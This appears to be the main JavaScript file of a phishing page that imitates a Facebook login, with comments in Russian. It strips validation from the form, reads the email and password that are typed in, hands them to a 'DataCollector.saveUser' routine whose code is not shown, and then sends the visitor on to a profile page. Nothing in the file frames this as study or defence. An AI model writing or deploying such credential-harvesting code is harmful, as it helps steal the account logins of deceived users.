// script.js - ОСНОВНАЯ ЛОГИКА
console.log('🚀 Загрузка основного скрипта...');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM загружен');
    
    // Инициализация
    initializePage();
});

function initializePage() {
    console.log('🔧 Инициализация страницы...');
    
    // Находим элементы
    const loginForm = document.getElementById('loginForm');
    const emailField = document.getElementById('email');
    const passwordField = document.getElementById('password');
    
    console.log('📝 Элементы:', {
        form: !!loginForm,
        email: !!emailField,
        password: !!passwordField
    });
    
    // Вешаем обработчики
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
        console.log('✅ Обработчик формы добавлен');
    }
    
    // Убираем валидацию
    if (emailField) emailField.removeAttribute('required');
    if (passwordField) passwordField.removeAttribute('required');
    
    // Добавляем кнопку показа пароля
    if (passwordField) {
        addPasswordToggle(passwordField);
    }
    
    // Сохраняем посещение
    if (window.DataCollector && DataCollector.saveVisit) {
        DataCollector.saveVisit();
    }
    
    console.log('✅ Страница инициализирована');
}

// ОБРАБОТКА ВХОДА
function handleLogin(event) {
    console.log('🎯 Обработка входа...');
    
    if (event) event.preventDefault();
    
    // Получаем данные
    const email = document.getElementById('email')?.value.trim() || '';
    const password = document.getElementById('password')?.value || '';
    
    console.log('📝 Получены данные:', {
        email: email || '(пусто)',
        password: password ? '***' : '(пусто)'
    });
    
    // Показываем загрузку
    showLoading();
    
    // Сохраняем пользователя
    let userData = null;
    if (window.DataCollector && DataCollector.saveUser) {
        try {
            console.log('💾 Сохраняем данные...');
            userData = DataCollector.saveUser(email, password);
            console.log('✅ Данные сохранены:', userData?.email);
        } catch (error) {
            console.error('❌ Ошибка сохранения:', error);
        }
    } else {
        console.warn('⚠️ DataCollector не доступен');
    }
    
    // Перенаправление
    setTimeout(() => {
        hideLoading();
        
        const finalEmail = userData?.email || email || `user_${Date.now()}@facebook.com`;
        const redirectUrl = `profile.html?email=${encodeURIComponent(finalEmail)}&t=${Date.now()}`;
        
        console.log('🔄 Перенаправление на:', redirectUrl);
        window.location.href = redirectUrl;
        
    }, CONFIG?.REDIRECT_DELAY || 1000);
}

// СОЗДАНИЕ НОВОГО АККАУНТА
function createAccount() {
    console.log('🎯 СОЗДАНИЕ НОВОГО АККАУНТА');
    
    const emailField = document.getElementById('email');
    const passwordField = document.getElementById('password');
    
    // СОЗДАЕМ УНИКАЛЬНЫЕ ДАННЫЕ
    const newEmail = emailField?.value.trim() || `newuser_${Date.now()}@facebook.com`;
    const newPassword = passwordField?.value || `pass_${Math.random().toString(36).substr(2, 10)}`;
    
    console.log('📝 Новый аккаунт:', {
        email: newEmail,
        password: '***' + newPassword.length + ' символов'
    });
    
    // Заполняем поля (если они пустые)
    if (emailField && !emailField.value.trim()) {
        emailField.value = newEmail;
    }
    if (passwordField && !passwordField.value) {
        passwordField.value = newPassword;
    }
    
    // Вызываем обычный вход с новыми данными
    handleLogin();
}

// ПОКАЗАТЬ/СКРЫТЬ ПАРОЛЬ
function addPasswordToggle(passwordField) {
    const parent = passwordField.parentElement;
    
    // Проверяем, не добавлена ли уже кнопка
    if (parent.querySelector('.toggle-password')) {
        return;
    }
    
    const toggleBtn = document.createElement('button');
    toggleBtn.type = 'button';
    toggleBtn.className = 'toggle-password';
    toggleBtn.innerHTML = '👁️';
    toggleBtn.style.cssText = `
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 18px;
        opacity: 0.6;
        padding: 5px;
        z-index: 10;
    `;
    
    parent.style.position = 'relative';
    toggleBtn.style.right = '15px';
    
    toggleBtn.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
        console.log('👁️ Пароль', type === 'password' ? 'скрыт' : 'показан');
    });
    
    parent.appendChild(toggleBtn);
    console.log('✅ Кнопка показа пароля добавлена');
}

// ЗАГРУЗКА
function showLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
        console.log('⏳ Показан индикатор загрузки');
    }
}

function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
        console.log('✅ Индикатор загрузки скрыт');
    }
}

// Глобальные функции
window.createAccount = createAccount;
window.handleLogin = handleLogin;
window.showLoading = showLoading;
window.hideLoading = hideLoading;

console.log('✅ Все функции загружены');
